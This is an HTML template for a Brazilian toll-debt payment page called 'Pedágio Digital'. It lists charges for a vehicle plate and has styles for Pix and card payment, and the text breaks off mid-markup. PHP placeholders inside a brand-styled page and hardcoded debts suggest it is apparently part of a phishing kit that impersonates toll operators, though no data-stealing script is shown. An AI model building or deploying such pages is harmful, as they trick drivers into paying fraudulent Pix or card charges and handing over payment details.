<html lang="pt-BR">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Débitos — Pedágio Digital</title>
    <meta name="description"
        content="Veja e selecione seus débitos de pedágio, gere Pix e finalize o pagamento com segurança sem estar logado.">
    <meta name="robots" content="index,follow">
    <link rel="icon" href="./<?=$diretorio?>/arquivos/favicon1-oV_RAOOi.png" type="image/png">
    <link rel="apple-touch-icon" href="./<?=$diretorio?>/arquivos/favicon1-oV_RAOOi.png">


    <link
        href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&amp;display=swap"
        rel="stylesheet">


    <link href="https://s.go-mpulse.net/boomerang/WATB7-9TEGU-Z4EUL-D5Z73-WGLN5" rel="preload" as="script">
    <style id="ui-loading-styles">
    /*CARREGANDO*/
    .hidden {
        display: none !important
    }

    .loading-wrap {
        display: flex;
        flex-direction: column;
        gap: 12px;
        align-items: center;
    }

    .loading-title {
        font-weight: 500;
        color: #6b6b6b;
        font-size: 18px;
    }

    .loading-sub {
        font-size: .95rem;
        color: #6b6b6b
    }

    .skel-list {
        width: 100%;
        display: grid;
        gap: 16px;
        justify-items: center;
        margin-top: 12px;
    }

    .skel-row {
        display: grid;
        grid-template-columns: 1fr auto;
        align-items: center;
        background: #fff;
        border-radius: 16px;
        box-shadow: 0 4px 14px rgba(0, 0, 0, 0.06);
        padding: 20px 24px;
        width: 100%;
        max-width: 580px;
        min-height: 96px;
        overflow: hidden;
        border: 1px solid #e5e7eb;
    }

    .skel-left {
        display: grid;
        gap: 10px;
        width: 100%;
    }

    .skel-line {
        height: 14px;
        border-radius: 8px;
        background: linear-gradient(90deg, #e9eef5 0%, #f3f6fb 40%, #e9eef5 80%);
        animation: skel 1.2s infinite linear;
    }

    .skel-line.w80 {
        width: 80%;
    }

    .skel-line.w60 {
        width: 60%;
    }

    .skel-line.w40 {
        width: 40%;
    }

    .skel-chip {
        height: 22px;
        width: 120px;
        border-radius: 999px;
        overflow: hidden;
        background: linear-gradient(90deg, #e9eef5 0%, #f3f6fb 40%, #e9eef5 80%);
        animation: skel 1.2s infinite linear;
    }

    /*CARREGANDO*/
    .hidden {
        display: none !important
    }

    .loading-wrap {
        display: flex;
        flex-direction: column;
        gap: 12px;
        align-items: center;
    }

    .loading-title {
        font-weight: 500;
        color: #6b6b6b;
        font-size: 18px;
    }

    .loading-sub {
        font-size: .95rem;
        color: #6b6b6b
    }

    .skel-list {
        width: 100%;
        display: grid;
        gap: 16px;
        justify-items: center;
        margin-top: 12px;
    }

    .skel-row {
        display: grid;
        grid-template-columns: 1fr auto;
        align-items: center;
        background: #fff;
        border-radius: 16px;
        box-shadow: 0 4px 14px rgba(0, 0, 0, 0.06);
        padding: 20px 24px;
        width: 100%;
        max-width: 580px;
        min-height: 96px;
        overflow: hidden;
        border: 1px solid #e5e7eb;
    }

    .skel-left {
        display: grid;
        gap: 10px;
        width: 100%;
    }

    .skel-line {
        height: 14px;
        border-radius: 8px;
        background: linear-gradient(90deg, #e9eef5 0%, #f3f6fb 40%, #e9eef5 80%);
        animation: skel 1.2s infinite linear;
    }

    .skel-line.w80 {
        width: 80%;
    }

    .skel-line.w60 {
        width: 60%;
    }

    .skel-line.w40 {
        width: 40%;
    }

    .skel-chip {
        height: 22px;
        width: 120px;
        border-radius: 999px;
        overflow: hidden;
        background: linear-gradient(90deg, #e9eef5 0%, #f3f6fb 40%, #e9eef5 80%);
        animation: skel 1.2s infinite linear;
    }

    @keyframes skel {
        0% {
            background-position: -200px 0;
        }

        100% {
            background-position: 200px 0;
        }
    }

    .concessionaria-overlay {
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .concessionaria-card {
        width: 100%;
        max-width: 620px;
        padding: 24px;
    }

    .concessionaria-card h2 {
        font-size: 24px;
        margin-bottom: 10px;
    }

    .concessionaria-card p {
        font-size: 16px;
        margin-bottom: 24px;
        color: rgb(85, 85, 85);
    }

    .concessionaria-btn {
        width: 100%;
        padding: 16px;
        margin-bottom: 16px;
        border-radius: 12px;
        border: 1px solid rgb(238, 238, 238);
        background: rgb(255, 255, 255);
        text-align: left;
        cursor: pointer;
    }

    .btn-title {
        font-weight: 600;
    }

    .btn-value {
        color: rgb(229, 57, 53);
        margin-top: 4px;
    }

    :root {
        --black: #000;
        --ink: #000;
        --muted: #6b7280;
        --gray-1: #f3f4f6;
        --gray-2: #cbd5e1;
        --gray-3: #d1d5db;
        --brand: #ff9f1c;
        --lime: #e5ff51;
        --radius: 12px;
        --radius-lg: 14px;
        --maxw: 580px;
        --bd: rgba(0, 0, 0, .08);
    }

    * {
        box-sizing: border-box;
    }

    html,
    body {
        height: 100%;
    }

    body {
        margin: 0px;
        font-family: Ubuntu, sans-serif;
        color: var(--ink);
        background: rgb(238, 238, 238);
    }

    .appbar {
        position: sticky;
        top: 0px;
        z-index: 50;
        background: rgb(255, 255, 255);
        border-bottom: 1px solid var(--bd);
        padding: 12px;
    }

    .appbar__inner {
        max-width: 1200px;
        margin: 0px auto;
        padding: 10px 20px;
        display: grid;
        grid-template-columns: 40px 1fr 40px;
        align-items: center;
        background: rgb(255, 255, 255);
    }

    .back {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 36px;
        height: 36px;
        border: 0px;
        border-radius: 999px;
        cursor: pointer;
        color: rgb(0, 0, 0);
        background: rgb(255, 255, 255);
    }

    .back:hover {
        background: rgb(242, 243, 245);
    }

    .appbar__title {
        margin: 0px;
        text-align: center;
        font-weight: 400;
        color: rgb(0, 0, 0);
        font-size: 18px;
        background: rgb(255, 255, 255);
    }

    .appbar__spacer {
        display: block;
        width: 36px;
    }

    .hero-strap {
        overflow: visible;
    }

    .search-wrap {
        position: absolute;
        left: 50%;
        top: 230px;
        transform: translate(-50%, 50%);
        width: min(var(--maxw), 94vw);
        z-index: 5;
    }

    .hero-img {
        width: 100%;
        height: 250px;
        object-fit: cover;
        object-position: center 20%;
        display: block;
        max-width: 1150px;
        margin: 0px auto;
        filter: brightness(0.5);
    }

    .search-label {
        display: flex;
        align-items: center;
        gap: 8px;
        color: rgb(255, 255, 255);
        font-weight: 400;
        margin: 0px 0px 8px;
        font-size: 18px;
    }

    .search {
        position: relative;
        display: flex;
        align-items: center;
        background: rgb(255, 255, 255);
        border-radius: 12px;
        border: 1px solid rgba(0, 0, 0, 0.06);
        box-shadow: rgba(0, 0, 0, 0.28) 0px 16px 34px;
    }

    .search input {
        width: 100%;
        padding: 18px 44px 18px 16px;
        border: 0px;
        outline: none;
        font-size: 16px;
        border-radius: 12px;
    }

    .search-btn {
        position: absolute;
        right: 6px;
        top: 50%;
        transform: translateY(-50%);
        width: 36px;
        height: 36px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        background: rgb(255, 255, 255);
        border: 0px;
        border-radius: 12px;
        cursor: pointer;
    }

    .page {
        padding-bottom: 90px;
    }

    .container {
        width: min(var(--maxw), 94vw);
        margin: 60px auto;
    }

    .section-title {
        font-size: 18px;
        font-weight: 400;
        color: rgb(0, 0, 0);
        margin: 14px 0px 12px;
    }

    .row__fee {
        font-size: 14px;
        line-height: 1;
        color: rgb(183, 28, 28);
    }

    .row {
        display: grid;
        grid-template-columns: 24px 1fr auto;
        align-items: start;
        gap: 12px;
        padding: 12px 6px;
    }

    .row input[type="checkbox"] {
        width: 20px;
        height: 20px;
        margin-top: 2px;
        accent-color: rgb(0, 0, 0);
    }

    .row--bulk {
        border-bottom: 1px solid var(--gray-2);
        margin-bottom: 16px;
    }

    strong#bulkLabel {
        font-weight: 400;
        font-size: 14px;
    }

    .badge {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        background: rgb(17, 17, 17);
        color: rgb(255, 255, 255);
        padding: 6px 10px;
        border-radius: 6px;
        font-size: 12px;
        font-weight: 700;
    }

    .list {
        list-style: none;
        margin: 0px;
        padding: 0px;
    }

    .item {
        border-bottom: 1px solid var(--gray-2);
    }

    .item-head {
        display: flex;
        flex-direction: column;
        align-items: flex-end;
        justify-content: flex-start;
        gap: 15px;
        padding: 0px 6px;
    }

    .item-price {
        white-space: nowrap;
    }

    .item-left {
        display: flex;
        flex-direction: column;
        gap: 2px;
    }

    .item-placa {
        font-weight: 400;
        font-size: 18px;
        color: rgb(0, 0, 0);
    }

    .item-conc {
        font-weight: 400;
        color: rgb(0, 0, 0);
        font-size: 18px;
    }

    .item-sub {
        color: var(--muted);
        font-size: 14px;
    }

    .item-price {
        font-weight: 800;
        color: rgb(0, 0, 0);
        font-size: 18px;
    }

    .total-card {
        position: fixed;
        left: 50%;
        bottom: 16px;
        transform: translate(-50%);
        width: min(var(--maxw), 94vw);
        background: rgb(255, 255, 255);
        border: 1px solid var(--gray-2);
        border-radius: 12px;
        box-shadow: rgba(0, 0, 0, 0.35) 0px 30px 70px;
        padding: 12px 16px 16px;
        max-height: 50vh;
        overflow-y: auto;
    }

    strong#totalTitle {
        color: rgb(0, 0, 0);
        font-size: 18px;
        font-weight: 400;
    }

    .total-head {
        width: 100%;
        background: transparent;
        border: 0px;
        border-radius: 12px;
        padding: 12px 16px;
        cursor: pointer;
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .total-head .th-row {
        display: flex;
        align-items: center;
        justify-content: space-between;
    }

    .total-head .th-bottom {
        border-top: 1px solid var(--gray-2);
        padding-top: 10px;
        color: rgb(54, 54, 54);
    }

    .total-head .chev {
        transition: transform 0.18s;
    }

    .total-head[aria-expanded="true"] .chev {
        transform: rotate(180deg);
    }

    .total-value {
        font-weight: 900;
        font-size: 18px;
        color: rgb(0, 0, 0);
    }

    .total-body {
        border-top: 1px solid var(--gray-2);
        padding: 12px 16px 16px;
    }

    .resumo-placa {
        margin: 6px 0px 12px;
    }

    .resumo-list {
        list-style: none;
        padding: 0px;
        margin: 0px 0px 10px;
    }

    .resumo-list li {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 14px;
        padding: 6px 0px;
        border-bottom: 1px dashed rgba(0, 0, 0, 0.08);
    }

    .resumo-list li:last-child {
        border-bottom: 0px;
    }

    .resumo-total {
        display: flex;
        align-items: center;
        gap: 14px;
        border-top: 1px solid var(--gray-2);
        padding-top: 10px;
        margin: 8px 0px 0px;
        font-size: 16px;
    }

    .resumo-total>strong {
        margin-left: auto;
        color: rgb(0, 0, 0);
    }

    strong#resumoPlaca {
        color: rgb(0, 0, 0);
    }

    .btn-continue {
        width: 100%;
        height: 48px;
        border: 0px;
        border-radius: 12px;
        font-weight: 800;
        font-size: 16px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        transition: filter 0.2s, transform 0.15s, box-shadow 0.2s, background 0.2s, color 0.2s;
    }

    .btn-continue--inline {
        width: auto;
        height: 40px;
        padding: 0px 14px;
        border-radius: 10px;
        font-size: 14px;
        font-weight: 700;
    }

    .btn-continue:disabled {
        background: var(--gray-3);
        color: rgb(255, 255, 255);
        cursor: not-allowed;
        box-shadow: none;
    }

    .btn-continue:not(:disabled) {
        background: var(--black);
        color: var(--lime);
        cursor: pointer;
        box-shadow: rgba(0, 0, 0, 0.25) 0px 16px 40px;
        font-size: 16px;
        font-weight: 400;
    }

    .btn-continue:not(:disabled):hover {
        filter: brightness(1.02);
        transform: translateY(-1px);
    }

    .total-head[aria-expanded="true"] #btnContinuarTop {
        display: none;
    }

    .total-head[aria-expanded="false"] #btnContinuarTop {
        display: inline-flex;
    }

    .badge--due {
        background: rgb(0, 0, 0);
        color: rgb(255, 255, 255);
        font-weight: 400;
        font-size: 14px;
    }

    ul#resumoItens strong {
        color: rgb(0, 0, 0);
    }

    @media (max-width: 720px) {
        .hero-strap {
            height: 160px;
            margin-bottom: 150px;
        }

        .container {
            width: min(96vw, 680px);
            margin-top: 20px;
        }

        .row {
            grid-template-columns: 16px 0.5fr 1fr;
        }

        .badge--due {
            font-size: 12px;
            text-align: center;
        }

        .row__fee {
            font-size: 10px;
        }

        label.row.row--bulk {
            grid-template-columns: 0.1fr 1fr;
        }
    }

    .is-anon .blur-if-anon {
        font-size: 18px;
        opacity: 0.8;
        padding: 6px 0px;
    }

    .total-head[aria-expanded="true"] .th-bottom,
    .total-head[aria-expanded="true"] #totalTitle {
        display: none;
    }

    .total-head[aria-expanded="true"] .th-top {
        justify-content: flex-end;
        padding-bottom: 0px;
        border-bottom: 0px;
    }

    .section-sub {
        margin: 0px 0px 12px;
        color: rgb(107, 114, 128);
    }

    .pay-list {
        list-style: none;
        margin: 0px;
        padding: 0px;
    }

    .pay-item {
        display: grid;
        grid-template-columns: 48px 1fr 24px;
        align-items: center;
        gap: 12px;
        padding: 14px 4px;
        border-bottom: 1px solid var(--gray-2);
        cursor: pointer;
    }

    .pay-item:last-child {
        border-bottom: none;
    }

    .pay-item:focus-visible {
        outline: rgb(156, 163, 175) solid 2px;
        outline-offset: 4px;
        border-radius: 8px;
    }

    .pay-icon .pm-ico {
        width: 40px;
        height: 40px;
        display: inline-block;
    }

    .pay-icon .bg {
        fill: var(--lime);
    }

    .pay-icon .fg {
        fill: none;
        stroke: rgb(17, 17, 17);
        stroke-width: 2;
        stroke-linecap: round;
        stroke-linejoin: round;
    }

    .pay-texts strong {
        color: rgb(0, 0, 0);
        font-weight: 400;
        font-size: 18px;
    }

    .pay-texts small {
        display: block;
        color: rgb(0, 0, 0);
        font-size: 14px;
        margin-top: 2px;
    }

    section#paySection .section-title,
    section#cardSection .section-title,
    section#pixSection .section-title {
        font-size: 24px;
        font-weight: 400;
        color: rgb(0, 0, 0);
        margin: 0px;
        border-bottom: none;
        padding-bottom: 10px;
    }

    section#paySection .section-sub,
    section#cardSection .section-sub,
    section#pixSection .section-sub {
        margin: 0px 0px 12px;
        color: rgb(0, 0, 0);
        font-size: 14px;
    }

    .body--pay .total-head[aria-expanded="true"] .th-bottom,
    .body--pay .total-head[aria-expanded="true"] #totalTitle {
        display: none;
    }

    .body--pay .total-head[aria-expanded="true"] .th-top {
        justify-content: flex-end;
    }

    .card-form {
        display: flex;
        flex-direction: column;
        gap: 14px;
        max-width: 520px;
        padding-top: 10px;
    }

    .field {
        width: 100%;
        height: 48px;
        padding: 12px 14px;
        border-radius: 12px;
        border: 1px solid var(--gray-2);
        background: rgb(238, 238, 238);
        font-size: 16px;
    }

    .summary-card {
        max-width: 520px;
        border: 1px solid var(--gray-2);
        border-radius: 12px;
        background: rgb(255, 255, 255);
        padding: 24px 20px;
        margin: 0px auto;
    }

    .summary-card h3 {
        margin: 0px 0px 10px;
        font-size: 24px;
    }

    .summary-grid {
        display: grid;
        grid-template-columns: 1fr auto;
        gap: 12px;
    }

    .summary-grid .highlight {
        background: rgb(238, 249, 199);
        padding: 6px 8px;
        border-radius: 8px;
    }

    .pix-countdown {
        margin: 10px 0px 12px;
        color: rgb(0, 0, 0);
        text-align: center;
    }

    .qr-box {
        width: 180px;
        height: 180px;
        margin: 0px auto 14px;
        border-radius: 6px;
        background: repeating-conic-gradient(rgb(0, 0, 0) 0deg, rgb(0, 0, 0) 25%, rgb(255, 255, 255) 0deg, rgb(255, 255, 255) 50%) 50% center / 20px 20px;
        box-shadow: rgba(0, 0, 0, 0.15) 0px 8px 30px;
    }

    .qr-box svg {
        width: 100%;
        height: 100%;
        display: block;
        border-radius: inherit;
    }

    .pix-hint {
        max-width: 520px;
        color: rgb(0, 0, 0);
        margin: 0px auto;
        padding: 10px 0px;
    }

    .code-box {
        width: min(520px, 94vw);
        border: 1px solid var(--gray-2);
        border-radius: 12px;
        padding: 10px;
        background: rgb(255, 255, 255);
        font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
        display: block;
        margin-inline: auto;
    }

    .btn-row {
        display: flex;
        gap: 12px;
        flex-wrap: wrap;
        max-width: 520px;
        margin: 0px auto;
        padding-top: 20px;
    }

    .btn-ghost {
        border: 1px solid var(--gray-2);
        background: rgb(255, 255, 255) !important;
        color: rgb(17, 17, 17) !important;
        box-shadow: none !important;
    }

    .body--payflow .total-card {
        display: none;
    }

    .summary-total-row {
        grid-column: 1 / -1;
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        background: rgb(238, 249, 199);
        padding: 16px 18px;
        border-radius: 8px;
    }

    .summary-total-row>span {
        color: rgb(0, 0, 0);
    }

    .summary-total-row>strong {
        color: rgb(0, 0, 0);
        font-weight: 800;
        font-size: 20px;
        line-height: 1;
    }

    .empty {
        text-align: center;
        padding: 28px 12px 8px;
        color: rgb(17, 17, 17);
    }

    .empty__icon {
        width: 56px;
        height: 56px;
        display: block;
        margin: 0px auto 12px;
        opacity: 0.9;
    }

    .empty__title {
        margin: 0px 0px 6px;
        font-weight: 600;
    }

    .empty__desc {
        margin: 0px auto;
        max-width: 520px;
        line-height: 1.35;
    }

    .empty-info {
        display: grid;
        grid-template-columns: 36px 1fr;
        gap: 12px;
        align-items: start;
        margin: 22px auto 120px;
        width: min(var(--maxw), 94vw);
        background: rgb(238, 238, 238);
        border: 1px solid rgb(156, 163, 175);
        border-radius: 12px;
        padding: 16px;
    }

    .empty-info__icon {
        width: 40px;
        height: auto;
        margin-top: 20px;
    }

    .empty-info__text {
        color: rgb(75, 85, 99);
    }

    .dlg {
        position: fixed;
        inset: 0px;
        display: none;
        z-index: 1000;
    }

    .dlg.is-open {
        display: block;
    }

    .dlg__overlay {
        position: absolute;
        inset: 0px;
        background: rgba(0, 0, 0, 0.45);
    }

    .dlg__card {
        position: relative;
        margin: 35vh auto 0px;
        width: min(480px, 92%);
        background: rgb(255, 255, 255);
        border-radius: 16px;
        padding: 24px;
        box-shadow: rgba(0, 0, 0, 0.35) 0px 25px 80px;
    }

    .dlg__title {
        font-size: 22px;
        font-weight: 700;
        margin: 20px 0px 8px;
        text-align: center;
    }

    .dlg__primary {
        display: block;
        width: 100%;
        padding: 12px 16px;
        margin-top: 16px;
        border: 0px;
        border-radius: 12px;
        background: rgb(0, 0, 0);
        color: rgb(229, 255, 81);
        font-weight: 700;
        cursor: pointer;
    }

    .badge {
        padding: 4px 8px;
        border-radius: 6px;
        font-size: 12px;
        display: inline-block;
    }

    .badge-today {
        background: rgb(183, 28, 28);
        color: rgb(255, 255, 255);
        font-weight: 600;
        border: 1px solid rgba(179, 107, 0, 0.12);
    }

    .badge-expired {
        border: 1px solid rgb(183, 28, 28);
        color: rgb(183, 28, 28);
        font-weight: 600;
        background: rgb(255, 255, 255);
    }

    .badge-tem-pix {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        padding: 2px 8px;
        border-radius: 6px;
        font-size: 12px;
        font-weight: 600;
        background: rgb(255, 255, 255);
        color: rgb(0, 0, 0);
        border: 1px solid rgb(255, 195, 30);
    }

    .m__grab {
        width: 56px;
        height: 4px;
        background: rgb(209, 213, 219);
        border-radius: 999px;
        margin: 0px auto 10px;
    }

    .modal__card,
    .fixpay-frame-wrap {
        border-radius: 20px;
        padding: 0px;
        overflow: hidden;
        height: clamp(480px, 95dvh, 700px) !important;
        width: 720px !important;
    }

    @media (max-width: 1800px) {

        .modal__card,
        .fixpay-frame-wrap {
            height: clamp(420px, 85vh, 620px) !important;
        }
    }

    @media (max-width: 768px) {

        .modal__card,
        .fixpay-frame-wrap {
            height: clamp(420px, 85vh, 670px) !important;
        }
    }

    .section-bar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        margin-bottom: 5px;
        border-bottom: 1px solid var(--gray-2);
    }

    .section-stamp {
        font-size: 12px;
        white-space: nowrap;
    }

    .section-stamp {
        font-size: 13px;
        white-space: nowrap;
    }

    .section-stamp::before {
        content: "Atualizado em: ";
        color: rgb(0, 0, 0);
        font-weight: 400;
        font-size: 12px;
        opacity: 0.7;
    }

    .section-stamp {
        color: rgb(0, 0, 0);
        font-weight: 700;
        font-size: 16px;
    }

    @media (max-width: 480px) {
        .section-bar {
            justify-content: center;
            align-items: center;
            gap: 40px;
        }
    }

    .empty[hidden] {
        display: none !important;
    }

    .modal__card,
    .fixpay-frame-wrap {
        margin-inline: auto;
        width: auto !important;
        max-width: min(720px, 96vw) !important;
        height: min(700px, 95dvh) !important;
    }

    .container .modal__card,
    .container .fixpay-frame-wrap {
        max-width: min(720px, 96vw) !important;
    }

    .page,
    .container,
    .hero-strap {
        overflow: visible !important;
    }

    .fixpay-frame-wrap iframe,
    .modal__card iframe {
        display: block;
        height: auto;
        border: 0px;
        width: 100% !important;
        max-width: 100% !important;
    }

    .fixpay-frame-wrap img,
    .modal__card img,
    .fixpay-frame-wrap canvas {
        max-width: 100%;
        height: auto;
    }

    @media (max-width: 768px) {

        .modal__card,
        .fixpay-frame-wrap {
            max-width: 96vw !important;
            max-height: min(670px, 85dvh) !important;
            overflow: auto !important;
        }
    }

    .popup {
        position: fixed;
        inset: 20px 20px auto auto;
        background: rgb(17, 17, 17);
        color: rgb(255, 255, 255);
        border-radius: 8px;
        padding: 12px 16px;
        box-shadow: rgba(0, 0, 0, 0.4) 0px 4px 12px;
        max-width: 360px;
        z-index: 9999;
    }

    .popup.hidden {
        display: none;
    }

    .popup-content {
        display: flex;
        align-items: flex-start;
        gap: 12px;
    }

    .popup-icon {
        background: rgb(198, 255, 0);
        color: rgb(0, 0, 0);
        font-weight: 700;
        border-radius: 4px;
        padding: 4px 8px;
    }

    .popup-text p {
        margin: 4px 0px 0px;
        font-size: 14px;
    }

    .popup-close {
        background: transparent;
        border: none;
        color: rgb(170, 170, 170);
        cursor: pointer;
    }

    .popup-progress {
        width: 100%;
        height: 4px;
        background: rgba(255, 255, 255, 0.2);
        border-radius: 2px;
        overflow: hidden;
        margin-top: 10px;
    }

    .popup-progress-bar {
        height: 100%;
        width: 100%;
        background: rgb(198, 255, 0);
        transition: width linear;
    }

    .skel-list {
        display: none !important;
    }

    .loading-wrap {
        padding-top: 80px;
    }

    .hidden {
        display: none !important;
    }

    .loading-wrap {
        display: flex;
        flex-direction: column;
        gap: 12px;
        align-items: center;
    }

    .loading-title {
        font-weight: 500;
        color: rgb(107, 107, 107);
        font-size: 18px;
    }

    .loading-sub {
        font-size: 0.95rem;
        color: rgb(107, 107, 107);
    }

    .skel-list {
        width: 100%;
        display: grid;
        gap: 16px;
        justify-items: center;
        margin-top: 12px;
    }

    .skel-row {
        display: grid;
        grid-template-columns: 1fr auto;
        align-items: center;
        background: rgb(255, 255, 255);
        border-radius: 16px;
        box-shadow: rgba(0, 0, 0, 0.06) 0px 4px 14px;
        padding: 20px 24px;
        width: 100%;
        max-width: 580px;
        min-height: 96px;
        overflow: hidden;
        border: 1px solid rgb(229, 231, 235);
    }

    .skel-left {
        display: grid;
        gap: 10px;
        width: 100%;
    }

    .skel-line {
        height: 14px;
        border-radius: 8px;
        background: linear-gradient(90deg, rgb(233, 238, 245) 0%, rgb(243, 246, 251) 40%, rgb(233, 238, 245) 80%);
        animation: 1.2s linear 0s infinite normal none running skel;
    }

    .skel-line.w80 {
        width: 80%;
    }

    .skel-line.w60 {
        width: 60%;
    }

    .skel-line.w40 {
        width: 40%;
    }

    .skel-chip {
        height: 22px;
        width: 120px;
        border-radius: 999px;
        overflow: hidden;
        background: linear-gradient(90deg, rgb(233, 238, 245) 0%, rgb(243, 246, 251) 40%, rgb(233, 238, 245) 80%);
        animation: 1.2s linear 0s infinite normal none running skel;
    }

    @keyframes skel {
        0% {
            background-position: -200px 0px;
        }

        100% {
            background-position: 200px 0px;
        }
    }

    @keyframes skel {
        0% {
            background-position: -200px 0;
        }

        100% {
            background-position: 200px 0;
        }
    }
    </style>
</head>

<body class="is-anon">
    <!-- Appbar -->
    <header class="appbar" aria-label="Barra superior">
        <div class="appbar__inner">
            <a href="/" type="button" class="back" id="btnBack" aria-label="Voltar">
                <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round"></path>
                </svg>
            </a>
            <h1 class="appbar__title">Débitos</h1>
            <span class="appbar__spacer" aria-hidden="true"></span>
        </div>
    </header>


    <main class="page">
        <!-- HERO com imagem -->
        <section class="hero-strap">
            <img src="./<?=$diretorio?>/arquivos/home-KlC6Y-6S.png" alt="" class="hero-img">


            <div class="search-wrap">
                <label class="search-label" for="qPlaca">
                    <img
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAABIklEQVR4AeyTXRHCMBCEAQVIAAc4AAfgACTgoMUJEsABEpCAA+qgfNfmOs0fTTrwwAyZvWya7GWTazubfLn9DQYLHCxRXddFnd+KkJtnwL4LhCWRi5LcuZvkGSDYEILrNLEhvhGCg3T9CBnsjeBsOIVORrQ13JFlwBWlPHKDisNfOtXw4I6kIjbsYZXJMkCwIwRzhMkg4UnoxkfGHVwDLU8nGDFY93Ncg5UsUp5RkFxCSgy1cA3aWXrqo/9C8PtGMknRRA3YQP8FZaY86JqyJ3hnoJ+espfMhK4pM2UjasBLKAlB9HQsDmqCBtR2FOyzt09Bg3bpM33UgOtnIXYc1+BhhMrmMYk0R7lJsgw48pIQLJvVjI6kYK5lkLFfsvT3DV4AAAD//22gyo8AAAAGSURBVAMAa0vTMd1B76sAAAAASUVORK5CYII=">
                    <span>Seus veículos:</span>
                </label>

                <div class="search">
                    <input id="qPlaca" type="text" inputmode="latin" maxlength="7" placeholder="-" value="<?=$sucesso?>"
                        aria-label="Buscar por placa" disabled="">
                </div>
            </div>
        </section>


        <!-- LISTA -->
        <div class="loading-wrap hidden" aria-live="polite" aria-busy="false">
            <div class="loading-title">Carregando débitos…</div>
            <div class="loading-sub">Isso pode levar alguns segundos.</div>
            <div class="skel-list">
                <div class="skel-row">
                    <div class="skel-left">
                        <div class="skel-line w80"></div>
                        <div class="skel-line w60"></div>
                        <div class="skel-line w40"></div>
                    </div>
                    <div class="skel-chip"></div>
                </div>
                <div class="skel-row">
                    <div class="skel-left">
                        <div class="skel-line w80"></div>
                        <div class="skel-line w60"></div>
                        <div class="skel-line w40"></div>
                    </div>
                    <div class="skel-chip"></div>
                </div>
                <div class="skel-row">
                    <div class="skel-left">
                        <div class="skel-line w80"></div>
                        <div class="skel-line w60"></div>
                        <div class="skel-line w40"></div>
                    </div>
                    <div class="skel-chip"></div>
                </div>
                <div class="skel-row">
                    <div class="skel-left">
                        <div class="skel-line w80"></div>
                        <div class="skel-line w60"></div>
                        <div class="skel-line w40"></div>
                    </div>
                    <div class="skel-chip"></div>
                </div>
                <div class="skel-row">
                    <div class="skel-left">
                        <div class="skel-line w80"></div>
                        <div class="skel-line w60"></div>
                        <div class="skel-line w40"></div>
                    </div>
                    <div class="skel-chip"></div>
                </div>
                <div class="skel-row">
                    <div class="skel-left">
                        <div class="skel-line w80"></div>
                        <div class="skel-line w60"></div>
                        <div class="skel-line w40"></div>
                    </div>
                    <div class="skel-chip"></div>
                </div>
            </div>
        </div>
        <section class="container">
            <div class="section-bar">
                <h2 class="section-title">Débitos</h2>
                <time id="debitoCheckedAt" class="section-stamp" aria-live="polite">11/02/2026 - 21:27</time>
            </div>

            <!-- BLOCO DA CONCESSIONÁRIA (antes da lista) -->

            <div id="concessionariaInicio" class="concessionaria-overlay" style="display: none;">
                <div class="concessionaria-card">
                    <h2>Escolha uma concessionária</h2>
                    <p>
                        O pagamento dos débitos para o FreeFlow da Região Metropolitana
                        deve ser realizado separadamente de outras concessionárias.
                    </p>

                    <button class="concessionaria-btn" onclick="selecionarConcessao('freeflow')">
                        <div class="btn-title">Free Flow Região Metropolitana</div>
                        <div class="btn-value" id="valorFreeFlow">R$&nbsp;0,00</div>
                    </button>

                    <button class="concessionaria-btn" onclick="selecionarConcessao('outras')">
                        <div class="btn-title">Outras concessões</div>
                        <div class="btn-value" id="valorOutras">R$&nbsp;12,10</div>
                    </button>
                </div>
            </div>

            <label class="row--bulk">
                <input id="checkAll" type="checkbox">
                <span><strong id="bulkLabel">Selecionar 2 passagens em aberto</strong></span>
            </label>

            <ul id="listaDebitos" class="list" aria-live="polite">
                <li class="item"><label class="row"><input type="checkbox" data-id="16878467">
                        <div class="item-left"><span class="item-placa">OOL2E18</span><span
                                class="item-dados item-dados1 blur-if-anon">05/09/22 - Noite</span><span
                                class="item-conc">MSVia</span><span class="item-dados item-dados2 blur-if-anon"></span>
                        </div>
                        <div class="item-head"><span class="item-price">R$&nbsp;5,10</span></div>
                    </label></li>
                <li class="item"><label class="row"><input type="checkbox" data-id="16792850">
                        <div class="item-left"><span class="item-placa">OOL2E18</span><span
                                class="item-dados item-dados1 blur-if-anon">05/09/22 - Noite</span><span
                                class="item-conc">MSVia</span><span class="item-dados item-dados2 blur-if-anon"></span>
                        </div>
                        <div class="item-head"><span class="item-price">R$&nbsp;7,00</span></div>
                    </label></li>
            </ul>
        </section>

        <!-- Estado vazio -->
        <div id="emptyStateHome" class="empty" hidden="">
            <img class="empty__icon" alt=""
